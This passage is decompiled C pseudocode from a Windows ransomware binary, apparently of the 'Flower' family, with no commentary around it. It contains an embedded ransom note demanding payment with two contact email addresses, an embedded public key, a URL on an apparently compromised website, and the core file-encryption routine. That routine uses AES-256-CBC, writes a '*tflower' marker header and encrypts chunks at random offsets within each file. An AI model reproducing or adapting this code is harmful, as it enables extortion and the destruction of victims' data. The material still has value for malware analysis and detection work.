  1157645637,
  -2130673279,
  1929409395,
  1828744557,
  -2080340860,
  -1627349089,
  -301928722,
  1241533002,
  -1023360061,
  771763758,
  -1056915007,
  16777473,
  -436148506,
  620766501,
  1207978056,
  -1728013927,
  -1191134791,
  -1291799629,
  2063629179,
  -117376519,
  -838807858,
  -1090469953,
  -553590817,
  1895854449,
  687876393,
  -855585331,
  1811967084,
  318771987,
  1677747300,
  -1694458981,
  1660969827,
  -1660904035,
  -1073692480,
  1258310475,
  -1224689737,
  -1526684251,
  -1996453495,
  1593859935,
  -1325354575,
  385881879,
  -201263884,
  -1140802372,
  -754920493,
  1174423110,
  -822030385,
  922761015,
  1577082462,
  1191200583,
  -1811901292,
  -100599046,
  -67044100,
  1526750043,
  -1761568873,
  -33489154,
  1509972570,
  -1409241940,
  1006648380,
  1275087948,
  50332419,
  889206069,
  -218041357,
  587211555,
  -1207912264,
  1560304989,
  1778412138,
  -1845456238,
  -721365547,
  553656609,
  1140868164,
  1358975313,
  -973027642,
  2097184125,
  956315961,
  -2097118333,
  -603923236,
  -1442796886,
  2080406652,
  1996519287,
  1442862678,
  83887365,
  452991771,
  -1543461724,
  352326933,
  872428596,
  503324190,
  469769244,
  -134153992,
  1375752786,
  536879136,
  335549460,
  -385816087,
  -1124024899,
  -587145763,
  -469703452,
  -1593794143,
  -536813344,
  -1979676022,
  -251596303,
  -704588074,
  2046851706,
  -1157579845,
  -486480925,
  1073758272,
  1325420367,
  -1600231809,
  1003262091,
  -1233459112,
  1286239154,
  -957401297,
  -380665154,
  1426019237,
  -237801700,
  283453434,
  -563598051,
  -1336506174,
  -1276722691
}; // weak
_QWORD WHIRLPOOL_Constants_140120940[1] = { -2868660196197001192i64 }; // weak
_UNKNOWN unk_140121940; // weak
_UNKNOWN unk_140121990; // weak
char *off_140121BB0 = "BOOL"; // weak
char aTrue[5] = "TRUE"; // weak
char aFalse[6] = "FALSE"; // weak
char aTrue_0[5] = "true"; // weak
_BYTE byte_14012207C[4] = { 89, 69, 83, 0 }; // weak
_BYTE byte_140122080[4] = { 121, 101, 115, 0 }; // weak
char aFalse_0[6] = "false"; // weak
char BASE64_table_140122160[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"; // weak
_BYTE byte_1401221B0[128] =
{
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -32,
  -16,
  -1,
  -1,
  -15,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -32,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  62,
  -1,
  -14,
  -1,
  63,
  52,
  53,
  54,
  55,
  56,
  57,
  58,
  59,
  60,
  61,
  -1,
  -1,
  -1,
  0,
  -1,
  -1,
  -1,
  0,
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16,
  17,
  18,
  19,
  20,
  21,
  22,
  23,
  24,
  25,
  -1,
  -1,
  -1,
  -1,
  -1,
  -1,
  26,
  27,
  28,
  29,
  30,
  31,
  32,
  33,
  34,
  35,
  36,
  37,
  38,
  39,
  40,
  41,
  42,
  43,
  44,
  45,
  46,
  47,
  48,
  49,
  50,
  51,
  -1,
  -1,
  -1,
  -1,
  -1
}; // weak
char aCopy[5] = "copy"; // weak
char aMove[5] = "move"; // weak
_UNKNOWN unk_140122638; // weak
_UNKNOWN unk_1401226B0; // weak
_UNKNOWN unk_140122750; // weak
_UNKNOWN unk_1401227C0; // weak
_UNKNOWN unk_140122830; // weak
_UNKNOWN unk_1401228A0; // weak
char aIa5org[7] = "ia5org"; // weak
_UNKNOWN unk_140122B70; // weak
int dword_140122C78[8] = { 0, 1, 1, 0, 0, 0, 0, 0 }; // weak
int dword_140122C98[8] = { 99, 12, 31, 23, 59, 59, 12, 59 }; // weak
int dword_140122D30[] = { 0 }; // weak
int dword_140122D58[10] = { 99, 99, 12, 31, 23, 59, 59, 12, 59, 0 }; // weak
_UNKNOWN unk_140122F50; // weak
_UNKNOWN unk_140123000; // weak
_UNKNOWN unk_1401231F0; // weak
_UNKNOWN unk_1401232F0; // weak
_UNKNOWN unk_140123360; // weak
_UNKNOWN unk_1401233F0; // weak
_UNKNOWN unk_140123880; // weak
_UNKNOWN unk_1401238D0; // weak
_UNKNOWN unk_140123AE0; // weak
_UNKNOWN unk_140123B30; // weak
_UNKNOWN unk_140123FA8; // weak
_UNKNOWN unk_1401240D0; // weak
_UNKNOWN unk_1401241F0; // weak
_UNKNOWN unk_140124260; // weak
char aHash[5] = "hash"; // weak
char aAlways[7] = "always"; // weak
_UNKNOWN unk_140125098; // weak
_UNKNOWN unk_140125190; // weak
_UNKNOWN unk_140125240; // weak
_UNKNOWN unk_1401252B0; // weak
_UNKNOWN unk_140125360; // weak
_UNKNOWN unk_140125440; // weak
_UNKNOWN unk_140125520; // weak
_UNKNOWN unk_140125590; // weak
_UNKNOWN unk_140125620; // weak
_UNKNOWN unk_1401256F0; // weak
_UNKNOWN unk_1401257C0; // weak
_UNKNOWN unk_140125900; // weak
_UNKNOWN unk_140125970; // weak
_UNKNOWN unk_140125DA0; // weak
_UNKNOWN unk_140125E68; // weak
_UNKNOWN unk_140125EE0; // weak
_UNKNOWN unk_140126020; // weak
_UNKNOWN unk_1401260B0; // weak
char *off_1401269F0[44] =
{
  "No error",
  "Operation not permitted",
  "No such file or directory",
  "No such process",
  "Interrupted function call",
  "Input/output error",
  "No such device or address",
  "Arg list too long",
  "Exec format error",
  "Bad file descriptor",
  "No child processes",
  "Resource temporarily unavailable",
  "Not enough space",
  "Permission denied",
  "Bad address",
  "Unknown error",
  "Resource device",
  "File exists",
  "Improper link",
  "No such device",
  "Not a directory",
  "Is a directory",
  "Invalid argument",
  "Too many open files in system",
  "Too many open files",
  "Inappropriate I/O control operation",
  "Unknown error",
  "File too large",
  "No space left on device",
  "Invalid seek",
  "Read-only file system",
  "Too many links",
  "Broken pipe",
  "Domain error",
  "Result too large",
  "Unknown error",
  "Resource deadlock avoided",
  "Unknown error",
  "Filename too long",
  "No locks available",
  "Function not implemented",
  "Directory not empty",
  "Illegal byte sequence",
  "Unknown error"
}; // weak
void (*qword_1401276D8[2])(void) = { NULL, NULL }; // weak
void (*qword_1401276E8)(void) = NULL; // weak
void *Block = &unk_140134430; // idb
int dword_140134A10 = -2; // weak
HANDLE hObject = (HANDLE)0xFFFFFFFFFFFFFFFEi64; // idb
int dword_140134A38 = 1; // weak
__int64 (__fastcall *off_140134A40)(_QWORD) = &sub_14001D8E0; // weak
__int64 (__fastcall *off_140134A48)(_QWORD, _QWORD) = &sub_14001D970; // weak
__int64 (__fastcall *off_140134A50)(_QWORD, _QWORD, _QWORD) = &sub_14001D930; // weak
char *off_140134A58 = "0123456789ABCDEF"; // weak
void *off_140134A60 = &unk_1400F5F60; // weak
__int64 (__fastcall *off_140134AB0)(_QWORD, _QWORD, _QWORD) = &memset; // weak
int dword_140134AC0 = 16777216; // weak
int dword_140134CF0 = 4096; // weak
int dword_140134E20 = 2; // weak
int dword_140134FD0 = 128; // weak
int dword_140134FD4 = 1; // weak
char *off_140134FF0 = "B-163"; // weak
_UNKNOWN unk_140134FF8; // weak
char **off_1401350E0 = &off_1400DD3A0; // weak
int dword_1401350E8 = 1061; // weak
void *off_1401350F0 = &unk_1400F7750; // weak
char *off_140135158[4] =
{
  "openssl",
  "Software engine support",
  "dynamic",
  "Dynamic engine loading support"
}; // weak
char *off_140135160[3] = { "Software engine support", "dynamic", "Dynamic engine loading support" }; // weak
char *off_140135168[2] = { "dynamic", "Dynamic engine loading support" }; // weak
char *off_140135170 = "Dynamic engine loading support"; // weak
int dword_140135178 = -1; // weak
int dword_140135180 = -1; // weak
int dword_140135184 = -1; // weak
int dword_140135188 = -1; // weak
int dword_14013518C = -1; // weak
_DWORD dword_140135190[2] = { 405504, 0 }; // weak
_DWORD dword_1401352E0[2] = { 99, 0 }; // weak
int dword_1401354D0 = 1; // weak
char *off_1401354D8[2] = { "capi", "CryptoAPI ENGINE" }; // weak
char *off_1401354E0 = "CryptoAPI ENGINE"; // weak
__int64 (__fastcall *off_140135520[6])() =
{
  &sub_140040170,
  &sub_1400405C0,
  &sub_1400400F0,
  &sub_140040190,
  &sub_1400405E0,
  &sub_140040600
}; // weak
char *off_140135570 = "OpenSSL PKCS#1 RSA (from Eric Young)"; // weak
char *off_1401355E0 = "OpenSSL DH Method"; // weak
char *off_140135630 = "OpenSSL DSA method"; // weak
_UNKNOWN unk_140135690; // weak
_UNKNOWN unk_1401356F0; // weak
_UNKNOWN unk_140135750; // weak
int dword_140135900 = 252108800; // weak
_DWORD dword_1401359C0[2] = { 251658341, 0 }; // weak
int dword_140135A00 = 537280512; // weak
_DWORD dword_140135C90[2] = { 536871012, 0 }; // weak
int dword_140135EE0 = 50851840; // weak
_DWORD dword_1401361B0[2] = { 50331748, 0 }; // weak
_DWORD dword_140136300[2] = { 218103979, 0 }; // weak
int dword_1401369F0 = 218513408; // weak
_DWORD dword_140137030[2] = { 268435571, 0 }; // weak
int dword_1401373F0 = 269352960; // weak
int dword_140137D10 = 117850112; // weak
int dword_140137D50 = 688271360; // weak
_DWORD dword_140137DA0[2] = { 687865955, 0 }; // weak
int dword_140137DE0 = 67682304; // weak
_DWORD dword_140138170[2] = { 67108964, 0 }; // weak
int dword_140138570 = 84303872; // weak
_DWORD dword_1401386B0[2] = { 83886181, 0 }; // weak
int dword_140138790 = 168181760; // weak
_DWORD dword_140138900[2] = { 167772262, 0 }; // weak
int dword_1401389D0 = 134647808; // weak
_DWORD dword_140138A50[2] = { 134217830, 0 }; // weak
int dword_140138A80 = 101339136; // weak
_DWORD dword_140138ED0[2] = { 100663439, 0 }; // weak
int dword_1401392A0 = 151515136; // weak
_DWORD dword_140139510[2] = { 150995044, 0 }; // weak
_DWORD dword_140139700[2] = { 553648245, 0 }; // weak
int dword_140139970 = 554205184; // weak
int dword_140139BA0 = 184958976; // weak
_DWORD dword_140139EE0[2] = { 184549486, 0 }; // weak
_DWORD dword_14013A110[2] = { 234881134, 0 }; // weak
int dword_14013A220 = 235307008; // weak
int dword_14013A360 = 571097088; // weak
_DWORD dword_14013A730[2] = { 570425462, 0 }; // weak
_DWORD dword_14013AB50[2] = { 587202660, 0 }; // weak
int dword_14013ACB0 = 587632640; // weak
int dword_14013AE50 = 604389376; // weak
_DWORD dword_14013AE70[2] = { 603979876, 0 }; // weak
int dword_14013AE90 = 621166592; // weak
_DWORD dword_14013B0D0[2] = { 620757092, 0 }; // weak
int dword_14013B1E0 = 671559680; // weak
_DWORD dword_14013B300[2] = { 671088744, 0 }; // weak
int dword_14013B3D0 = 638271488; // weak
_DWORD dword_14013B630[2] = { 637534308, 0 }; // weak
int dword_14013B870 = 654729216; // weak
_DWORD dword_14013B970[2] = { 654311525, 0 }; // weak
int dword_14013BB20 = 788979712; // weak
_DWORD dword_14013BE90[2] = { 788529284, 0 }; // weak
_DWORD dword_14013C100[2] = { 771752035, 0 }; // weak
int dword_14013C630 = 772157440; // weak
int dword_14013CB40 = 839340032; // weak
_DWORD dword_14013CD00[2] = { 838860908, 0 }; // weak
int dword_14013CE20 = 856047616; // weak
_DWORD dword_14013CE90[2] = { 855638117, 0 }; // weak
int dword_14013CEE0 = 872824832; // weak
_DWORD dword_14013CF10[2] = { 872415332, 0 }; // weak
char *off_14013CF50 = "NULL shared library method"; // weak
_UNKNOWN unk_14013CFA8; // weak
int dword_14013CFF0 = 1; // weak
void *off_14013CFF8 = &byte_1400D7DAE; // weak
char *off_14013D000[4] =
{
  "Generator (compressed):",
  "Generator (uncompressed):",
  "Generator (hybrid):",
  "0123456789ABCDEF"
}; // weak
char *off_14013D008[3] = { "Generator (uncompressed):", "Generator (hybrid):", "0123456789ABCDEF" }; // weak
char *off_14013D010[2] = { "Generator (hybrid):", "0123456789ABCDEF" }; // weak
char *off_14013D018 = "0123456789ABCDEF"; // weak
char *off_14013D030 = "OpenSSL default"; // weak
char *off_14013D080 = "WIN32"; // weak
void *off_14013D178 = &unk_14013D150; // weak
int dword_14013D180 = 8192; // weak
char *off_14013D1D0[14] =
{
  "Jan",
  "Feb",
  "Mar",
  "Apr",
  "May",
  "Jun",
  "Jul",
  "Aug",
  "Sep",
  "Oct",
  "Nov",
  "Dec",
  "G",
  "H"
}; // weak
char *off_14013D230[2] = { "G", "H" }; // weak
_UNKNOWN unk_14013D808; // weak
char *off_14013D810 = "status_request"; // weak
char *off_14013D828 = "OpenSSL default user interface"; // weak
char *off_14013D860 = "0123456789ABCDEF"; // weak
char a04b40a53a3fe46[131] = "04B40A53A3FE46F62A71F7020286C882736A0A66F6B9D8FE8C99BB24A82D8A992EA1E6573CAE03A088C8175090BDEBA4EAB0A3B6A19F2A8642B6A45874E8C8267D"; // weak
char a0[2] = "0"; // weak
_UNKNOWN unk_14013E9DE; // weak
char aCUsersPublicPr[29] = "c:\\users\\public\\proxycap.idx"; // weak
char String1[] = "https://www.adamaitalycup.it/wp-includes/wp-merge.php"; // idb
CHAR Buffer[] = "\r\n                      IMPORTANT NOTICE THAT IS URGENT AND TRUE\r\n          =================================================================\r\n\r\nDear Sir/Ma,\r\n\r\nSorry to inform you but many files of your COMPANY has just been ENCRYPTED with a STRONG key.\r\nThis simply means that you will not be able to use your files until it is decrypted by the same key used in encrypting  it.\r\n\r\nTO get the DECRYPT TOOL for your COMPANY, you have to make payment to us so as to recover your files.\r\n\r\n                                    NOTE\r\n        ======================================================================\r\n\r\nYou may upload 1 of your encrypted files to test the decryption for free.\r\nBut, the file should not contain any valuable information.\r\n\r\nE-MAIL Address:=>>\r\n\r\nflower.harris@protonmail.com\r\nflower.harris@tutanota.com\r\n"; // idb
union _SLIST_HEADER stru_14013FBA0; // weak
_UNKNOWN unk_14013FBB0; // weak
int dword_14013FBB8; // weak
int dword_14013FD40; // weak
__int64 qword_14013FD48; // weak
void *qword_14013FF60; // idb
void *qword_14013FF68; // idb
void *qword_14013FF70; // idb
void *qword_14013FF78; // idb
__int64 qword_14013FF88; // weak
int dword_14013FF94; // weak
void *qword_14013FFA0; // idb
int dword_14013FFC4; // weak
int dword_14013FFC8; // weak
_onexit_table_t stru_14013FFD0; // idb
__int64 qword_140140018; // weak
__int64 qword_140140020[128]; // weak
int dword_140140420; // weak
__int64 qword_140140438; // weak
_UNKNOWN unk_140140470; // weak
int dword_140140824; // weak
HANDLE hHeap; // idb
__int64 qword_140140838; // weak
int dword_140140878; // weak
_DWORD dword_14014087C; // weak
__int64 qword_140140880; // weak
__int64 qword_140140888; // weak
int dword_140140890; // weak
int dword_140140894; // weak
_DWORD dword_140140898; // weak
int dword_14014089C; // weak
int dword_1401408A0; // weak
int dword_1401408A4; // weak
_DWORD dword_1401408A8; // weak
int dword_1401408AC; // weak
_DWORD dword_1401408B0; // weak
int dword_1401408B4; // weak
int dword_1401408B8; // weak
_DWORD dword_1401408BC; // weak
int dword_1401408C0; // weak
int dword_1401408C4; // weak
int dword_1401408C8; // weak
_DWORD dword_1401408CC; // weak
int dword_1401408D0; // weak
int dword_1401408D4; // weak
_DWORD dword_1401408D8; // weak
int dword_1401408DC; // weak
_DWORD dword_1401408E0; // weak
int dword_1401408E4; // weak
_DWORD dword_1401408E8; // weak
int dword_1401408EC; // weak
_DWORD dword_1401408F0; // weak
int dword_1401408F4; // weak
_DWORD dword_1401408F8; // weak
int dword_1401408FC; // weak
_DWORD dword_140140900; // weak
int dword_140140904; // weak
int dword_140140908; // weak
int dword_14014090C; // weak
_DWORD dword_140140910[2]; // weak
__int64 qword_140140918; // weak
__int64 qword_140140960; // weak
__int64 qword_140140980; // weak
_DWORD dword_140140990; // weak
_DWORD dword_140140994; // weak
__int64 qword_140140998; // weak
int dword_1401409A0; // weak
int dword_1401409A4; // weak
_DWORD dword_1401409A8[2]; // weak
__int64 qword_1401409B0; // weak
int dword_1401409C0; // weak
_UNKNOWN unk_1401409C8; // weak
_UNKNOWN unk_1401411C0; // weak
__int64 qword_1401422A0; // weak
__int64 qword_1401422A8; // weak
__int64 qword_1401422B0; // weak
__int64 qword_1401422B8; // weak
_DWORD dword_1401422C0; // weak
int dword_1401422C4; // weak
__int64 qword_1401422C8; // weak
int dword_1401422D0; // weak
_QWORD qword_1401422E0[256]; // weak
__int64 qword_140142AE0; // weak
_DWORD dword_140142AE8; // weak
int dword_140142AEC; // weak
_UNKNOWN unk_140142AF0; // weak
_UNKNOWN unk_140142B60; // weak
__int128 xmmword_140142B70; // weak
__int64 qword_140142B80; // weak
__int64 qword_140142B88; // weak
__int64 qword_140142B90; // weak
__int64 qword_140142B98; // weak
__int64 qword_140142BA0; // weak
__int64 qword_140142BA8; // weak
int dword_140142BB0; // weak
__int64 qword_140142BB8; // weak
__int64 qword_140142BC0; // weak
_DWORD dword_140142BC8; // weak
_DWORD dword_140142BCC; // weak
__int64 qword_140142BD0; // weak
__int64 qword_140142BD8; // weak
_DWORD dword_140142BE0[4]; // weak
int dword_140142BF0; // weak
int dword_140142BF4; // weak
__int64 qword_140142BF8; // weak
_DWORD dword_140142C00[2]; // weak
int dword_140142C08; // weak
int dword_140142C0C; // weak
__int64 qword_140142C10; // weak
__int64 qword_140142C18; // weak
int dword_140142C20; // weak
int dword_140142C24; // weak
__int64 qword_140142C28; // weak
_UNKNOWN unk_140142C30; // weak
_DWORD dword_140142C34; // weak
int dword_140142C38; // weak
__int64 qword_140142C40; // weak
__int64 qword_140142C48; // weak
__int64 qword_140142C50; // weak
int dword_140142C58; // weak
__int64 qword_140142C60; // weak
__int64 qword_140142C68; // weak
__int64 qword_140142C70; // weak
__int64 qword_140142C78; // weak
__int64 qword_140142C80; // weak
__int64 qword_140142C88; // weak
__int64 qword_140142C90; // weak
__int64 qword_140142C98; // weak
int dword_140142CA0; // weak
_DWORD dword_140142CA4; // weak
__int64 qword_140142CA8; // weak
__int64 qword_140142CB0; // weak
int dword_140142CB8; // weak
struct _exception *dword_140142CBC; // idb
int dword_140142CC0; // weak
int dword_140142CC4; // weak
__int128 xmmword_140142CC8; // weak
int dword_140142CD8; // weak
_BYTE byte_140142CE0[1048]; // weak
__int64 qword_1401430F8; // weak
__int64 qword_140143100; // weak
__int64 qword_140143108; // weak
char byte_140143110; // weak
_UNKNOWN unk_140143190; // weak
int dword_1401431A0; // weak
__int64 qword_140143358; // weak
__int64 qword_140143368; // weak
__int64 qword_140143370; // weak
__int64 qword_140143378; // weak
__int64 qword_140143380; // weak
__int64 qword_140143388; // weak
__int64 qword_140143390; // weak
__int64 qword_140143398; // weak
_DWORD dword_1401433A0[4]; // weak
_UNKNOWN unk_1401433B0; // weak
_UNKNOWN unk_140143418; // weak
_UNKNOWN unk_140143430; // weak
__int64 qword_140143480; // weak
__int64 qword_140143488; // weak
__int64 qword_140143490; // weak
char byte_1401434A0; // weak
__int64 qword_1401434F0; // weak
__int64 qword_140143508; // weak
_crt_signal_t qword_140143520; // idb
_crt_signal_t qword_140143530; // idb
_crt_signal_t qword_140143550; // idb
_crt_signal_t qword_140143568; // idb
_crt_signal_t qword_140143588; // idb
_crt_signal_t Function; // idb
DWORD Mode; // idb
DWORD dwMode; // idb
FILE *Stream; // idb
FILE *qword_140143620; // idb
int dword_140143628; // weak
int dword_14014362C; // weak
int dword_140143630; // weak
char byte_140143640[8224]; // weak
char byte_140145660[8192]; // weak
wchar_t Str1[1024]; // weak
_UNKNOWN unk_140147E68; // weak
_UNKNOWN unk_140147E70; // weak
__int64 qword_140147E78; // weak
__int64 qword_140147E80; // weak
_UNKNOWN unk_140147E88; // weak


//----- (0000000140001000) ----------------------------------------------------
__int64 __fastcall sub_140001000(wchar_t *FileName)
{
  char *v2; // r15
  __int64 *v3; // rax
  __int64 *v4; // rbx
  __int64 *v5; // rax
  __int64 *v6; // rdi
  __int64 v7; // r14
  _DWORD *v8; // rsi
  _QWORD *v9; // rbx
  __int64 *v10; // rax
  _QWORD *v11; // rdi
  _DWORD *v12; // rax
  int *v13; // r12
  void *v14; // rbx
  __int64 *v15; // rax
  __int64 *v16; // rdi
  void *v17; // rax
  std::ios_base *v18; // rbx
  _QWORD *v19; // rdi
  __int64 v20; // rax
  char *v21; // r9
  char *v22; // rcx
  char v23; // al
  int *v24; // r14
  FILE *v25; // rax
  FILE *v26; // rdi
  unsigned int v27; // eax
  __int64 v28; // rdx
  __int64 v29; // r8
  __int64 v30; // r9
  unsigned __int64 v31; // rax
  int v32; // r12d
  unsigned __int64 v33; // r13
  size_t v34; // rbx
  char *v35; // rax
  unsigned __int64 i; // rbx
  int v37; // ecx
  _QWORD *v38; // rax
  int v39; // esi
  int v40; // r14d
  _QWORD *v41; // r12
  int v42; // ebx
  int v43; // eax
  unsigned __int64 v44; // rbx
  unsigned __int64 v45; // rsi
  int v46; // edx
  __int64 v47; // rsi
  bool v48; // sf
  int v49; // r12d
  unsigned __int64 v50; // rax
  unsigned __int64 v51; // rbx
  unsigned __int64 v52; // r14
  int v53; // eax
  int v54; // eax
  unsigned __int64 v55; // rbx
  int v56; // ecx
  unsigned __int64 v57; // rbx
  unsigned __int64 v58; // rsi
  __int64 v59; // rax
  int v60; // r13d
  unsigned __int64 v61; // rbx
  unsigned __int64 v62; // rsi
  unsigned __int64 v63; // rsi
  unsigned __int64 v64; // rbx
  int v65; // eax
  unsigned __int64 j; // rbx
  unsigned int v67; // ebx
  unsigned __int64 v69; // [rsp+30h] [rbp-D0h]
  char *v70; // [rsp+38h] [rbp-C8h]
  int *v71; // [rsp+40h] [rbp-C0h]
  _QWORD *Block; // [rsp+48h] [rbp-B8h]
  unsigned __int64 v73; // [rsp+50h] [rbp-B0h]
  size_t v74; // [rsp+58h] [rbp-A8h] BYREF
  __int64 v75; // [rsp+60h] [rbp-A0h] BYREF
  __int64 v76; // [rsp+68h] [rbp-98h] BYREF
  __int64 v77[2]; // [rsp+70h] [rbp-90h] BYREF
  int v78; // [rsp+80h] [rbp-80h]
  int v79; // [rsp+84h] [rbp-7Ch]
  char v80[136]; // [rsp+88h] [rbp-78h] BYREF
  int v81[4]; // [rsp+110h] [rbp+10h] BYREF
  _DWORD v82[28]; // [rsp+120h] [rbp+20h] BYREF
  char Str1[8]; // [rsp+190h] [rbp+90h] BYREF
  __int64 v84[2]; // [rsp+1A0h] [rbp+A0h] BYREF
  _BYTE v85[32]; // [rsp+1B0h] [rbp+B0h] BYREF

  v2 = 0i64;
  v71 = (int *)sub_14001B520();
  v76 = 0i64;
  v75 = 0i64;
  v3 = sub_140020790(0x198u, 0i64);
  v4 = v3;
  if ( v3 )
  {
    if ( (unsigned int)sub_14001ED40(v3) == 1 && (unsigned int)sub_140020440(v4, 408, 6, 0x1001u, 0x19Fu, 0i64) == 1 )
    {
      if ( (unsigned int)sub_14001EC20(v4, &v75) )
      {
        v5 = sub_140020770(v75, 0i64);
        v6 = v5;
        if ( v5 )
        {
          if ( (unsigned int)sub_14001EB00(v5) == 1 )
            sub_14001EA10(v6, &v76);
          sub_140020670(v6);
        }
      }
    }
    sub_140020670(v4);
  }
  v7 = v76;
  v8 = 0i64;
  v9 = sub_14001C810(415);
  v10 = (__int64 *)sub_14001C740((__int64)v9);
  v11 = sub_14001DDB0(v10, a04b40a53a3fe46, 0i64, 0i64);
  if ( (unsigned int)sub_14001CB60((__int64)v9, v11) == 1 )
  {
    v12 = sub_14001D530();
    v8 = v12;
    if ( v12 )
    {
      if ( !sub_14001D670((__int64)v12, (__int64)v9) )
      {
        sub_14001D3C0((__int64)v8);
        v8 = 0i64;
      }
    }
  }
  if ( v11 )
    sub_1400222C0(v11);
  sub_14001C600((__int64)v9);
  Block = 0i64;
  v69 = 0i64;
  v84[0] = 0i64;
  v84[1] = 0i64;
  sub_14001E0C0(12, 0i64);
  v13 = (int *)sub_14001E950((__int64)"aes-256-cbc");
  if ( !v13 )
    return -1i64;
  v14 = 0i64;
  if ( !v7 )
    return -1i64;
  if ( !v8 )
    return -1i64;
  v15 = sub_140020770(v7, 0i64);
  v16 = v15;
  if ( !v15 )
    return -1i64;
  if ( (unsigned int)sub_140020BF0(v15) == 1
    && (unsigned int)sub_140020C80((__int64)v16, v8) == 1
    && (unsigned int)sub_140020A70(v16, 0i64, &v74) == 1 )
  {
    v17 = sub_14001D8E0(v74);
    v14 = v17;
    if ( v17 )
    {
      if ( (unsigned int)sub_140020A70(v16, (__int64)v17, &v74) != 1 )
      {
        sub_14001D930(v14);
        v14 = 0i64;
      }
    }
  }
  sub_140020670(v16);
  if ( !v14 )
    return -1i64;
  sub_14001F1B0(v82);
  sub_14001F220((__int64)v82, (unsigned int *)v14, v74);
  sub_14001EE90(v85, (__int64)v82);
  sub_14001D930(v14);
  v18 = (std::ios_base *)sub_14001D460(v7);
  v19 = (_QWORD *)std::ios_base::precision(v18);
  v20 = sub_14001C740((__int64)v18);
  v21 = (char *)sub_14001DEA0(v20, v19, 4, 0i64);
  v22 = v21;
  do
  {
    v23 = *v22;
    v22[v80 - v21] = *v22;
    ++v22;
  }
  while ( v23 );
  sub_14001D930(v21);
  sub_14001D3C0(v7);
  sub_14001D3C0((__int64)v8);
  v24 = v71;
  v77[0] = 0x7265776F6C66742Ai64;
  sub_14001B600((__int64)v71);
  sub_14001C050(v71, v13, 0i64, (__int64)v85, v84);
  v25 = wfopen(FileName, L"r+b");
  v26 = v25;
  if ( !v25 )
    goto LABEL_89;
  v27 = fread(Str1, 1ui64, 8ui64, v25);
  if ( v27 >= 9ui64 )
    _report_rangecheckfailure(v27, v28, v29, v30);
  Str1[v27] = 0;
  if ( !strcmp(Str1, "*tflower") )
    goto LABEL_89;
  fseek(v26, 0, 2);
  v31 = common_ftell<__int64>(v26);
  v75 = v31;
  v32 = v31;
  v77[1] = v31;
  if ( v31 > 0x1000000 )
  {
    v33 = (v31 - 0x1000000) >> 25;
    v79 = v33;
  }
  else
  {
    v33 = *(_QWORD *)Str1;
    v79 = 0;
  }
  fseek(v26, 0, 0);
  v34 = 8 * v79 + 160;
  v35 = (char *)j__malloc_base(v34);
  v70 = v35;
  if ( !v35 )
  {
    v2 = 0i64;
    goto LABEL_89;
  }
  *(_QWORD *)Str1 = fread(v35, 1ui64, v34, v26);
  if ( !*(_DWORD *)Str1 )
    goto LABEL_87;
  fseek(v26, 0, 0);
  for ( i = 0i64; i < 0xA0; i += fwrite((char *)v77 + i, 1ui64, 160 - i, v26) )
    ;
  v37 = v79;
  if ( v79 > 0 )
  {
    v38 = j__malloc_base(saturated_mul(v79, 8ui64));
    Block = v38;
    if ( !v38 )
      goto LABEL_87;
    v37 = v79;
    v39 = 0;
    if ( v79 > 0 )
    {
      v40 = 0;
      v41 = v38;
      do
      {
        v42 = 7168 * (unsigned __int16)rand();
        ++v41;
        ++v39;
        v43 = v40 + ((v42 + rand()) & 0x1FFFFFF) + 0x1000000;
        v40 += 0x2000000;
        *(v41 - 1) = v43;
        v37 = v79;
      }
      while ( v39 < v79 );
      v24 = v71;
      v32 = v75;
    }
    v44 = 0i64;
    v45 = 8i64 * v37;
    if ( v45 )
    {
      do
        v44 += fwrite((char *)Block + v44, 1ui64, v45 - v44, v26);
      while ( v44 < v45 );
      v37 = v79;
      v24 = v71;
    }
  }
  LODWORD(v74) = -1;
  v46 = -1;
  if ( v37 <= -1 )
  {
LABEL_72:
    v2 = v70;
    if ( !(unsigned int)sub_14001C080(v24, byte_140143640, v81, v70, *(int *)Str1) )
      goto LABEL_89;
    if ( v69 >= v33 || v81[0] <= 0 )
    {
      v60 = 0;
    }
    else
    {
      v60 = v33 - v69;
      common_fseek(v26, v69, 0i64);
      fwrite(byte_140143640, 1ui64, v60, v26);
    }
    fseek(v26, 0, 2);
    v61 = 0i64;
    v62 = v81[0] - v60;
    if ( v81[0] != v60 )
    {
      do
        v61 += fwrite(&byte_140143640[v60 + v61], 1ui64, v62 - v61, v26);
      while ( v61 < v62 );
      v24 = v71;
    }
    if ( !(unsigned int)sub_14001BF20((unsigned int *)v24, (__int64)byte_140143640, v81) )
      goto LABEL_89;
    v63 = v81[0];
    v64 = 0i64;
    if ( v81[0] )
    {
      do
        v64 += fwrite(&byte_140143640[v64], 1ui64, v63 - v64, v26);
      while ( v64 < v63 );
    }
    v65 = common_ftell<__int64>(v26);
    v78 = v65 - v75;
    fseek(v26, 0, 0);
    for ( j = 0i64; j < 0xA0; j += fwrite((char *)v77 + j, 1ui64, 160 - j, v26) )
      ;
    v67 = 0;
    goto LABEL_92;
  }
  v47 = -1i64;
  v76 = -1i64;
  while ( 1 )
  {
    if ( v47 >= 0 )
    {
      v50 = v69;
      v49 = 0x2000;
      LODWORD(v2) = v33 - v69;
      v33 = Block[v47];
      goto LABEL_56;
    }
    v48 = v32 - 160 < 0;
    v49 = v32 - 160;
    v33 = 160i64;
    if ( !v48 )
      break;
    v69 = 160i64;
LABEL_70:
    v32 = v75;
    ++v46;
    ++v47;
    LODWORD(v74) = v46;
    v76 = v47;
    if ( v46 >= v37 )
    {
      v24 = v71;
      goto LABEL_72;
    }
  }
  v50 = v69;
  if ( v49 > 0x1000000 )
    v49 = 0x1000000;
LABEL_56:
  v73 = v50;
  v51 = v50;
  v69 = v33;
  v52 = v33;
  if ( v49 <= 0 )
    goto LABEL_70;
  while ( 1 )
  {
    common_fseek(v26, v33, 0i64);
    v53 = 0x2000;
    if ( (unsigned int)v49 < 0x2000 )
      v53 = v49;
    v54 = fread(byte_140145660, 1ui64, v53, v26);
    if ( !v54 )
    {
LABEL_69:
      v37 = v79;
      v47 = v76;
      v46 = v74;
      goto LABEL_70;
    }
    v33 += v54;
